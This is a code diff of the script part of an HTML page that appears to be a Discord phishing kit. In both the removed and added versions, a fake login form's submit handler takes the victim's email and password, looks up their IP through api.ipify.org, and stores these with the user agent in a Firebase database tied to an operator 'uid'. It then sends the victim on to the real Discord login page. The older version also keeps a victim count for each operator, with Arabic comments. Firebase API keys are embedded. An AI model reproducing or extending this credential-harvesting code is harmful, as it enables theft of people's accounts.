@@ -86,88 +86,62 @@
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <script>
-        firebase.initializeApp({
-            apiKey: "AIzaSyCUXd1zE7AHDGiFO1khBFBXILU1Ba2tlMU",
+        // Initialize Firebase
+        const firebaseConfig = {
+            apiKey: "AIzaSyBKHWkWtRVBqAzZrTFRPEcUGCkTtMUZhVA",
             authDomain: "xcago-login.firebaseapp.com",
             databaseURL: "https://xcago-login-default-rtdb.europe-west1.firebasedatabase.app",
             projectId: "xcago-login",
-            storageBucket: "xcago-login.firebasestorage.app",
-            messagingSenderId: "887538896230",
-            appId: "1:887538896230:web:47945c0377344a402e8ca7"
-        });
+            storageBucket: "xcago-login.appspot.com",
+            messagingSenderId: "1040032027667",
+            appId: "1:1040032027667:web:6f5c0e7e60c7e8c7f2e0e5"
+        };
+        firebase.initializeApp(firebaseConfig);
 
-        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+        // Get the uid from URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const captor_uid = urlParams.get('uid');
+
+        // Handle form submission
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
-            const urlParams = new URLSearchParams(window.location.search);
-            const userId = urlParams.get('uid');
-            
-            if (!userId) {
-                console.error('رابط غير صالح');
-                return;
-            }
-            
-            const button = document.querySelector('button');
             const email = document.getElementById('emailORphone').value;
             const password = document.getElementById('password').value;
             
-            button.innerHTML = `<span class="spinner">...</span>`;
-            button.disabled = true;
-
-            try {
-                // الحصول على IP العميل
-                const ipResponse = await fetch('https://api.ipify.org');
-                const ip = await ipResponse.text();
-
-                // إنشاء معرف فريد للضحية
-                const victimId = Date.now().toString();
-                
-                const victimData = {
-                    email: email,
-                    password: password,
-                    ip: ip,
-                    timestamp: new Date().toISOString(),
-                    userAgent: navigator.userAgent,
-                    id: victimId
-                };
-
-                // التحقق من وجود المستخدم أولاً
-                const userRef = firebase.database().ref(`users/${userId}`);
-                const userSnapshot = await userRef.once('value');
-                
-                if (userSnapshot.exists()) {
-                    // إضافة الضحية تحت المستخدم المحدد
-                    await userRef.child('victims').child(victimId).set(victimData);
-                    
-                    // تحديث إجمالي عدد الضحايا
-                    const currentTotal = (await userRef.child('total_victims').once('value')).val() || 0;
-                    await userRef.child('total_victims').set(currentTotal + 1);
-                    
-                    // حفظ في discord_logins أيضاً للتوافق مع النظام القديم
-                    await firebase.database().ref('discord_logins').child(victimId).set({
+            // Get current timestamp
+            const timestamp = new Date().toISOString();
+            
+            // Get user's IP address and other info
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const victimData = {
                         email: email,
                         password: password,
-                        ip: ip,
-                        timestamp: new Date().toISOString(),
-                        userAgent: navigator.userAgent
-                    });
+                        ip: data.ip,
+                        timestamp: timestamp,
+                        userAgent: navigator.userAgent,
+                        uid: captor_uid // Store the captor's UID
+                    };
                     
-                    console.log('تم حفظ البيانات بنجاح');
-                } else {
-                    console.error('مستخدم غير موجود');
-                }
-
-                // إعادة التوجيه بعد 2 ثانية
-                setTimeout(() => {
+                    // Store in Firebase
+                    firebase.database().ref('discord_logins').push(victimData)
+                        .then(() => {
+                            // Redirect to real Discord after storing data
+                            window.location.href = 'https://discord.com/login';
+                        })
+                        .catch(error => {
+                            console.error('Error:', error);
+                            window.location.href = 'https://discord.com/login';
+                        });
+                })
+                .catch(error => {
+                    console.error('Error:', error);
                     window.location.href = 'https://discord.com/login';
-                }, 2000);
-
-            } catch (error) {
-                console.error('خطأ:', error);
-                button.disabled = false;
-                button.innerHTML = 'Log In';
-            }
+                });
         });
     </script>
+    <script src="./js/script.js"></script>
 </body>
 </html>
